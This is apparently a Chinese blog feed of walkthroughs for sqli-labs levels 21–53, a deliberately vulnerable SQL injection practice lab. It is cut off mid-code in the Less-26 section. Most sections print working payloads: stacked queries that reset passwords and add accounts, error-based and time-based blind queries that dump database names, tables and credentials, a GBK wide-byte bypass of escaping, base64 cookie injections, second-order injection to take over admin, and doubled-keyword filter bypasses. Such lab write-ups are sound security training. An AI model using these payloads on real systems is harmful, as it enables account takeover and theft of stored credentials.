        <content type="html"><![CDATA[<h1 id="sqli-labs通关-38-53"><a href="#sqli-labs通关-38-53" class="headerlink" title="sqli-labs通关(38-53)"></a>sqli-labs通关(38-53)</h1><p>堆叠注入，在数据库中可以执行多条SQL语句，语句之间以(;)隔开</p><hr><span id="more"></span><h2 id="Less-38GET-Stacked-Query-Injection-String"><a href="#Less-38GET-Stacked-Query-Injection-String" class="headerlink" title="Less-38GET- Stacked Query Injection - String"></a>Less-38GET- Stacked Query Injection - String</h2><p>单引号闭合，–+注释，堆叠注入</p><p>.<img src="/2021/04/28/sqli-labs38-53/image-20210428145307237.png" alt="image-20210428145307237"></p><p>因为要堆叠注入，我们用;再执行一条修改密码的语句：</p><pre class="line-numbers language-none"><code class="language-none">?id=1' ;update users set password ='123' where username='Dumb';--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428145501207.png" alt="image-20210428145501207"></p><h2 id="Less-39GET-Stacked-Query-Injection-Intiger-based"><a href="#Less-39GET-Stacked-Query-Injection-Intiger-based" class="headerlink" title="Less-39GET- Stacked Query Injection - Intiger based"></a>Less-39GET- Stacked Query Injection - Intiger based</h2><p>堆叠注入，数字型</p><p>改密：注释前有无分号都可</p><pre class="line-numbers language-none"><code class="language-none">?id=1;update users set password='123' where username='Dumb'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428150818966.png" alt="image-20210428150818966"></p><p>新增用户：id为101，username&amp;password为create1</p><pre class="line-numbers language-none"><code class="language-none">?id=1;insert into users values(101,'create1','create1');--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>id=101时</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428151714314.png" alt="image-20210428151714314"></p><h2 id="Less-40GET-BLIND-based-String-Stacked"><a href="#Less-40GET-BLIND-based-String-Stacked" class="headerlink" title="Less-40GET - BLIND based - String - Stacked"></a>Less-40GET - BLIND based - String - Stacked</h2><p>GET型，盲注，堆叠注入</p><p>此关关闭了报错，我们可以通过页面是否回显内容来判断语句是否正确执行</p><p>单引号）闭合，–+注释</p><p>改密：将id为1的密码改为123456</p><pre class="line-numbers language-none"><code class="language-none">?id=1');update users set password='123456' where username='Dumb'; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428152147740.png" alt="image-20210428152147740"></p><h2 id="Less-41GET-BLIND-based-Intiger-Stacked"><a href="#Less-41GET-BLIND-based-Intiger-Stacked" class="headerlink" title="Less-41GET-BLIND based - Intiger - Stacked"></a>Less-41GET-BLIND based - Intiger - Stacked</h2><p>数字型，盲注</p><p>关闭了报错，其余同39关</p><pre class="line-numbers language-none"><code class="language-none">?id=1;update users set password ='123' where username='Dumb' ;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428152522420.png" alt="image-20210428152522420"></p><h2 id="Less-42POST-Error-based-String-Stacked"><a href="#Less-42POST-Error-based-String-Stacked" class="headerlink" title="Less-42POST - Error based String Stacked"></a>Less-42POST - Error based String Stacked</h2><p>POST型，堆叠注入</p><p>我们再username出构造payload时发现失败了，查看源代码发现username经过了mysqli_real_escape_string()函数过滤，但是password并没有设置过滤</p><p>我们再password处构造payload：</p><pre class="line-numbers language-none"><code class="language-none">';update users set password ='55555' where username='admin';--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428154346809.png" alt="image-20210428154346809"></p><p>使用username:admin； password:55555登陆成功</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428154431854.png" alt="image-20210428154431854"></p><h2 id="Less-43POST-Error-based-String-Stacked-with-twist"><a href="#Less-43POST-Error-based-String-Stacked-with-twist" class="headerlink" title="Less-43POST - Error based - String - Stacked with twist"></a>Less-43POST - Error based - String - Stacked with twist</h2><p>同42，单引号闭合变为了单引号）闭合其余相同，还是在password处构造payload</p><h2 id="Less-44POST-Error-based-String-Stacked-Blind"><a href="#Less-44POST-Error-based-String-Stacked-Blind" class="headerlink" title="Less-44POST - Error based String Stacked -Blind"></a>Less-44POST - Error based String Stacked -Blind</h2><p>关闭了报错，单引号闭合</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428155117115.png" alt="image-20210428155117115"></p><p>使用 666 ；666登陆成功</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428155145549.png" alt="image-20210428155145549"></p><h2 id="Less-45-POST-Error-based-String-Stacked-Blind"><a href="#Less-45-POST-Error-based-String-Stacked-Blind" class="headerlink" title="Less-45 POST - Error based - String - Stacked - Blind"></a>Less-45 POST - Error based - String - Stacked - Blind</h2><p>同43关，闭合方式为单引号）</p><p>将上关的666；666改为666；66</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428155440697.png" alt="image-20210428155440697"></p><p>666；66登陆成功</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428155445857.png" alt="image-20210428155445857"></p><h2 id="Less-46-GET-Error-based-Numeric-ORDER-BY-CLAUSE"><a href="#Less-46-GET-Error-based-Numeric-ORDER-BY-CLAUSE" class="headerlink" title="Less-46 GET-Error based . Numeric . ORDER BY CLAUSE"></a>Less-46 GET-Error based . Numeric . ORDER BY CLAUSE</h2><p>按照提示，输入sort参数</p><p>出现了账号密码</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428155832437.png" alt="image-20210428155832437"></p><p>既然是排序表格，那我们也可以进行desc/asc进行排序</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428165858174.png" alt="image-20210428165858174"></p><p>输入单引号报错，说明存在报错注入</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428165743231.png" alt="image-20210428165743231"></p><p>我们进行报错注入</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?sort=(extractvalue(1,concat(0x7e,(select database() ) )))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428170101470.png" alt="image-20210428170101470"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">?sort=(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ) )))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428170204385.png" alt="image-20210428170204385"></p><p>爆列：</p><pre class="line-numbers language-none"><code class="language-none">?sort=(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' ) )))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428170309884.png" alt="image-20210428170309884"></p><p>爆值：</p><pre class="line-numbers language-none"><code class="language-none">?sort=(extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from security.users ) )))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428170459406.png"></p><pre class="line-numbers language-none"><code class="language-none">?sort=1 and sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在明显延迟，说明也可进行时间延迟型盲注</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428170705247.png" alt="image-20210428170705247"></p><h2 id="Less-47GET-Error-based-String-ORDER-BY-CLAUSE"><a href="#Less-47GET-Error-based-String-ORDER-BY-CLAUSE" class="headerlink" title="Less-47GET-Error based - String - ORDER BY CLAUSE"></a>Less-47GET-Error based - String - ORDER BY CLAUSE</h2><p>?sort=1’报错；?sort=1’ –+ 正常</p><p>同46即可</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?sort=1' and extractvalue(1,concat(0x7e,(select database() ) )) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428171323239.png" alt="image-20210428171323239"></p><p>不在赘述</p><h2 id="Less-48GET-Error-based-Blind-Numeric-ORDER-BY-CLAUSE"><a href="#Less-48GET-Error-based-Blind-Numeric-ORDER-BY-CLAUSE" class="headerlink" title="Less-48GET - Error based - Blind- Numeric- ORDER BY CLAUSE"></a>Less-48GET - Error based - Blind- Numeric- ORDER BY CLAUSE</h2><p>关闭了报错，无法进行报错注入，我们可以使用时间延迟型盲注</p><p>同46关</p><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">?sort=1 and if(left(database(),8)='security',sleep(5),1) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">?sort=1 and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不赘述了</p><h2 id="Less-49GET-Error-based-String-Blind-ORDER-BY-CLAUSE"><a href="#Less-49GET-Error-based-String-Blind-ORDER-BY-CLAUSE" class="headerlink" title="Less-49GET - Error based . String- Blind . ORDER BY CLAUSE"></a>Less-49GET - Error based . String- Blind . ORDER BY CLAUSE</h2><p>同样关闭了报错，同48关进行时间延迟型注入</p><h2 id="Less-50GET-Error-based-ORDER-BY-CLAUSE-numeric-Stacked-injection"><a href="#Less-50GET-Error-based-ORDER-BY-CLAUSE-numeric-Stacked-injection" class="headerlink" title="Less-50GET - Error based - ORDER BY CLAUSE -numeric- Stacked injection"></a>Less-50GET - Error based - ORDER BY CLAUSE -numeric- Stacked injection</h2><p>堆叠注入</p><p>查看源码<img src="/2021/04/28/sqli-labs38-53/image-20210428191255493.png" alt="image-20210428191255493"></p><p>发现了mysqli_multi_query函数，它可以执行多个sql语句，而mysqli_query()只能执行一个sql语句</p><p>插入id为55，账号为555，密码为555</p><pre class="line-numbers language-none"><code class="language-none">?sort=1;insert into users values(55,'555','555');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>?sort=1查看是否插入成功</p><p><img src="/2021/04/28/sqli-labs38-53/image-20210428191704075.png" alt="image-20210428191704075"></p><h2 id="Less-51GET-Error-based-ORDER-BY-CLAUSE-String-Stacked-Injection"><a href="#Less-51GET-Error-based-ORDER-BY-CLAUSE-String-Stacked-Injection" class="headerlink" title="Less-51GET - Error based - ORDER BY CLAUSE -String- Stacked Injection"></a>Less-51GET - Error based - ORDER BY CLAUSE -String- Stacked Injection</h2><p>?sort=1’ 报错</p><p>?sort=1’ –+ 正常</p><p>修改上关创建的555账号的密码</p><pre class="line-numbers language-none"><code class="language-none">?sort=1' ;update users set password='666' where username='555';--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428191926453.png" alt="image-20210428191926453"></p><h2 id="Less-52GET-Blind-based-ORDER-BY-CLAUSE-numeric-Stacked-injection"><a href="#Less-52GET-Blind-based-ORDER-BY-CLAUSE-numeric-Stacked-injection" class="headerlink" title="Less-52GET - Blind based - ORDER BY CLAUSE -numeric- Stacked injection"></a>Less-52GET - Blind based - ORDER BY CLAUSE -numeric- Stacked injection</h2><p>单引号双引号均无报错，直接数字型或者时间延迟都可</p><p>数字型：</p><pre class="line-numbers language-none"><code class="language-none">?sort=1;insert into users values(52,'52','52');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs38-53/image-20210428192251624.png" alt="image-20210428192251624"></p><h2 id="Less-53GET-GET-Blind-based-ORDER-BY-CLAUSE-String-stacked-injection"><a href="#Less-53GET-GET-Blind-based-ORDER-BY-CLAUSE-String-stacked-injection" class="headerlink" title="Less-53GET - GET - Blind based - ORDER BY CLAUSE -String- stacked injection"></a>Less-53GET - GET - Blind based - ORDER BY CLAUSE -String- stacked injection</h2><p>?sort=1 ‘报错</p><p>?sort=1’–+正常</p><p>关闭了报错，同51关</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page3 </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs31-37</title>
      <link href="/2021/04/28/sqli-labs31-37/"/>
      <url>/2021/04/28/sqli-labs31-37/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关31-37"><a href="#sqli-labs通关31-37" class="headerlink" title="sqli-labs通关31-37"></a>sqli-labs通关31-37</h1><span id="more"></span><h2 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31</strong> Protection with WAF</h2><p>WAF防护</p><p><strong>双引号） 闭合，–+注释，基于错误的联合注入</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=1&amp;id=.1") union select 1,2,database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs31-37/image-20210428133234146.png" alt="image-20210428133234146"></p><h2 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a><strong>Less-32</strong> Bypass addslashes()</h2><p>addslashes()绕过</p><p>查看源码</p><pre class="line-numbers language-none"><code class="language-none">function check_addslashes($string){    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash              return $string;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p><p>此题将单引号，双引号转换为双反斜杠（\）和\i表示不区分大小写</p><p>并且将字符集设置为gbk，导致可以进行宽字节注入来绕过单引号转义</p><p><img src="/2021/04/28/sqli-labs31-37/image-20210428134157625.png" alt="image-20210428134157625"></p><p>输入单引号发现是经过转义的</p><p><img src="/2021/04/28/sqli-labs31-37/image-20210428134706776.png" alt="image-20210428134706776"></p><p>因为gbk编码的，我们尝试%df’，然后将浏览器编码改为gbk，我们可以看到，他变成了汉字</p><p>这是因为加上反斜杠也就是%5c之后传入参数整体为%df%5c%27，而前面说过，在mysql里认为前两个字符是一个汉字，也就是‘運’，而后面的单引号就逃逸出来了</p><p><strong>–+注释，单引号闭合，%df绕过单引号转义，基于错误的联合注入</strong></p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1%df'  union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs31-37/image-20210428135401383.png" alt="image-20210428135401383"></p><p>正常步骤，不在赘述</p><h2 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h2><p>和上一关一致，只不过换成了addslashes函数转义</p><ul><li>addslashes() 函数<br>函数返回在预定义字符之前添加反斜杠的字符串。<br>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL</li></ul><p>payload同</p><h2 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h2><p>post方式，同32关</p><p><img src="/2021/04/28/sqli-labs31-37/image-20210428140100420.png" alt="image-20210428140100420"></p><p>要注意字段数变成2了，不是3</p><h2 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h2><p>为什么要担心addslashes()</p><p>查看源码<img src="/2021/04/28/sqli-labs31-37/image-20210428140354520.png" alt="image-20210428140354520"></p><p>数字型的，他的防护都没用，直接数字型注就可，</p><p><strong>数字型、基于错误的联合注入、直接注入</strong></p><pre class="line-numbers language-none"><code class="language-none">?id=-1 union select 1,2,database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs31-37/image-20210428140613542.png" alt="image-20210428140613542"></p><p>正常步骤，不在赘述</p><h2 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h2><p>MySQL Real Escape String绕过</p><p>MySQL Real Escape String()函数：转义在 SQL 语句中使用的字符串中的特殊字符。</p><p><img src="/2021/04/28/sqli-labs31-37/image-20210428140932098.png" alt="image-20210428140932098"></p><p>查看源码发现还是使用gbk编码</p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1%df' union select 1,2,database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs31-37/image-20210428141249842.png" alt="image-20210428141249842"></p><p>正常步骤，不再赘述</p><h2 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h2><p>同上关，变成了post传参</p><p>不赘述了，抓包改就可</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs21-30</title>
      <link href="/2021/04/25/sqli-labs21-30/"/>
      <url>/2021/04/25/sqli-labs21-30/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-lab通关-21-30"><a href="#sqli-lab通关-21-30" class="headerlink" title="sqli-lab通关(21-30)"></a>sqli-lab通关(21-30)</h1><span id="more"></span>  <h2 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a><strong>Less-21 Cookie Injection- Error Based- complex - string</strong></h2><p><strong>( 基于错误的复杂的字符型Cookie注入)</strong>  </p><p>base64编码，单引号，报错型，cookie注入  </p><p>登录如下</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210425203709195.png" alt="image-20210425203709195"></p><p>发现此关同20关差不多，只不过cookie中的uname经过base64编码了，所以我们猜测本题在cookie出加密了字符串，所以我们上传的payload需要经过base64编码</p><p>我们抓包放到reperter，我们在cookie处进行注入，接下里构造payload</p><pre class="line-numbers language-none"><code class="language-none">admin' and 1=1 # base64编码后YWRtaW4nIGFuZCAxPTEgLS0r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425205757906.png"></p><p>看此红圈提示，我们修改我们的payload，我们需要构造’)闭合</p><pre class="line-numbers language-none"><code class="language-none">admin') and 1=1 # base64编码后YWRtaW4nKSBhbmQgMT0xICM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425210012362.png" alt="image-20210425210012362"></p><p>猜字段：经过尝试发现为4时报错，说明为3</p><pre class="line-numbers language-none"><code class="language-none">admin') order by 3 #YWRtaW4nKSBvcmRlciBieSAzICM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425211032665.png" alt="image-20210425211032665"></p><p>爆库：使用报错型（显示查询结果）&amp;联合注入</p><pre class="line-numbers language-none"><code class="language-none">-admin') union select 1,2,database() #LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425211153505.png" alt="image-20210425211153505"></p><p>库名为:security</p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">-admin') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' #编码后LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425211508900.png" alt="image-20210425211508900"></p><p>爆列名：我们爆users</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210425211805656.png" alt="image-20210425211805656"></p><p>爆username&amp;password：</p><pre class="line-numbers language-none"><code class="language-none">-admin') union select 1,username,password from security.users #LWFkbWluJykgdW5pb24gc2VsZWN0IDEsdXNlcm5hbWUscGFzc3dvcmQgZnJvbSBzZWN1cml0eS51c2VycyAj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210425212012265.png" alt="image-20210425212012265"></p><p>发现用户名为Dumb 密码为Dumb</p><h2 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a><strong>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</strong></h2><p>base64编码，双引号，报错型，cookie注入</p><p>输入单引号报错，闭合仍报错；输入双引号报错，闭合不报错</p><p>我们只需将21关payload单引号改为双引号并把闭合的)去掉即可  </p><h2 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h2><p>报错型，过滤了注释符</p><p>根据提示我们输入id</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210426101032452.png" alt="image-20210426101032452"></p><p>输入双引号正常，输入单引号报错，说明是单引号；and 1=1 与and 1=2 相同，说明不是数字型；’ and ‘1’=’1 与 ‘ and ‘1’=’2不同说明是字符型；</p><pre class="line-numbers language-none"><code class="language-none">?id=1' and '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426101854811.png" alt="image-20210426101854811"></p><p>基于错误的、单引号、字符型，联合注入</p><p>猜字段：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1'  union select 1,2,3 '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426102253271.png" alt="image-20210426102253271"></p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1'  union select 1,2,database() '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426102341928.png" alt="image-20210426102341928"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426102703404.png" alt="image-20210426102703404"></p><p>爆列：</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426102932167.png" alt="image-20210426102932167"></p><p>爆值：</p><pre class="line-numbers language-none"><code class="language-none">?id=' union select 1,group_concat(username),group_concat(password) from security.users where  '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426103436028.png" alt="image-20210426103436028"></p><h2 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a><strong>Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</strong></h2><p>查看源码：</p><p>发现创建账户的username和pass都被mysql_escape_string函数转义了</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210426104935713.png" alt="image-20210426104935713"></p><p>但是我们发现修改密码的username未被转义</p><p><img src="/2021/04/25/sqli-labs21-30/image-20210426105041312.png" alt="image-20210426105041312"></p><p>我们的思路是先注册一个admin’#的账号，虽然被转义了，但是还是存到数据库中了，我们登陆此账户，修改密码，此时修改的就是admin管理员的密码。</p><p>Sql语句变为UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’</p><p>也就是执行了UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’  </p><p>注册号admin’#账号登录：<img src="/2021/04/25/sqli-labs21-30/image-20210426105437714.png" alt="image-20210426105437714"></p><p>此时修改的就是admin的密码，我们修改密码为111111，显示如下<img src="/2021/04/25/sqli-labs21-30/image-20210426105618936.png" alt="image-20210426105618936"></p><p>接下来登录admin 密码为111111<img src="/2021/04/25/sqli-labs21-30/image-20210426105655201.png" alt="image-20210426105655201"></p><p>管理员账号成功登录了</p><h2 id="Less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#Less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="Less-25 Trick with OR &amp; AND (过滤了or和and)"></a><strong>Less-25 Trick with OR &amp; AND (过滤了or和and)</strong></h2><p>or&amp;and欺骗  ，提示说所有的or&amp;and都属于我们，我们猜测他们被过滤了</p><p>我们尝试后发现输入or或and果然未发生变化，接下来我们的思路是想办法绕过，</p><p>我们尝试双写发现绕过了，我们这里猜测他是把or&amp;and替换为空<img src="/2021/04/25/sqli-labs21-30/image-20210426111404625.png" alt="image-20210426111404625"></p><p>查看源码发现没错<img src="/2021/04/25/sqli-labs21-30/image-20210426111718987.png" alt="image-20210426111718987"></p><p>单引号，基于错误的，union注入</p><p>这里information和password同样双写or即可</p><h2 id="Less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）"></a><strong>Less-25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）</strong></h2><p>or&amp;and欺骗&amp;盲注，那么盲注怎么判断过滤了or&amp;and呢？我们直接在id前加and或or<img src="/2021/04/25/sqli-labs21-30/image-20210426212326054.png" alt="image-20210426212326054"></p><p>发现跟?id=1相比无变化，得出被过滤的结论,同上关一样，我们可以通过双写绕过</p><p>方法一：时间延迟型盲注</p><p>测试，我们发现存在明显延迟</p><pre class="line-numbers language-none"><code class="language-none">?id=1 anandd sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426214227662.png" alt="image-20210426214227662"></p><p>爆库：  经过长时间努力终于爆出库名security</p><pre class="line-numbers language-none"><code class="language-none">?id=1 anandd if(left(database (),1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426214557861.png" alt="image-20210426214557861"></p><p>爆表：注意双写anandd, oorr,经过很长时间爆出第四个表为users</p><pre class="line-numbers language-none"><code class="language-none">?id=1 anandd if(left((select table_name from infoorrmation_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1) #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426215435421.png" alt="image-20210426215435421"></p><p>爆列：我们用正常的始见延迟行语句没出来，但是回显处值了，既然有回显我们用基于错误的联合注入（就离谱，说好的盲注呢？）</p><pre class="line-numbers language-none"><code class="language-none">-1 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426220956596.png" alt="image-20210426220956596"></p><p>爆值：</p><pre class="line-numbers language-none"><code class="language-none">username?id=1 anandd if(left((select username from users limit 0,1),4)='dumb' ,sleep(5),1)password?id=1 anandd if(left((select passwoorrd from users limit 0,1),4)='dumb' ,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/25/sqli-labs21-30/image-20210426221704656.png" alt="image-20210426221704656"></p><h2 id="Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26(failed) Trick with comments and space (过滤了注释和空格的注入)"></a><strong>Less-26(failed)</strong> Trick with comments and space (过滤了注释和空格的注入)</h2><p>评论欺骗</p><p>尝试后发现单引号报错，双引号正常，所以这里应该是单引号闭合，经过尝试发现过滤了很多东西，我们看下源码</p><pre class="line-numbers language-none"><code class="language-none">function blacklist($id){$id= preg_replace('/or/i',"", $id);//strip out OR (non case sensitive)$id= preg_replace('/and/i',"", $id);//Strip out AND (non case sensitive)$id= preg_replace('/[\/\*]/',"", $id);//strip out /*$id= preg_replace('/[--]/',"", $id);//Strip out --$id= preg_replace('/[#]/',"", $id);//Strip out #$id= preg_replace('/[\s]/',"", $id);//Strip out spaces$id= preg_replace('/[\/\\\\]/',"", $id);//Strip out slashesreturn $id;}<span aria-hidden="true" 